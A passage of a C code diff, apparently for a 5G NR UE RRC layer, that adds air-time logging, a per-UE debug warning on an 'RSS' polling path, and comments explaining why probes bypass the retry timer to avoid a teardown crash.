+                 wall_ms,
+                 wall_ms > 0 ? air_ms / wall_ms : 0.0);
+      rss_tick_t0_ns = now;
+      rss_air_frame_t0 = rss_air_frame;
+    }
+  }
+
+  bool polled = nr_timer_tick(t);
+
+  {
+    static int seen[RSS_MAX_UE];
+    const int u = ((int)rrc->ue_id >= 0 && (int)rrc->ue_id < RSS_MAX_UE) ? (int)rrc->ue_id : 0;
+    if (!seen[u]) {
+      seen[u] = 1;
+      LOG_W(NR_RRC, "[RSS] rss_poll reached: ue=%d enabled=%d probe=%d polled=%d\n",
+            u, (int)nr_rss_enabled(), (int)nr_rss_is_probe(u), (int)polled);
+    }
+  }
+  if (!nr_rss_enabled())
+    return;
+
+  /* The probe drives itself off rss_probe_next_ns, not off the retry timer:
+     nr_rss_arm_retry() is only called on RRCReject, and a probe that is simply
+     losing the RA race never gets one, so the timer was never started and the
+     branch below never ran (measured 2026-10-22: probe_attempt logged 0 times
+     in every run). Let probes through regardless of the timer. */
+  /* A-NAS holders drive themselves from here, like the probe does. Re-arming
+     from nr_rrc_going_to_IDLE() instead was tried on 2026-10-22 and reproduced
+     the 2026-10-20 crash shape (channel timeout -> Resynchronizing RX -> core),
+     because a retry armed mid-teardown can fire on the next tick while the UE
+     is only half released. Polling from here never touches teardown. */
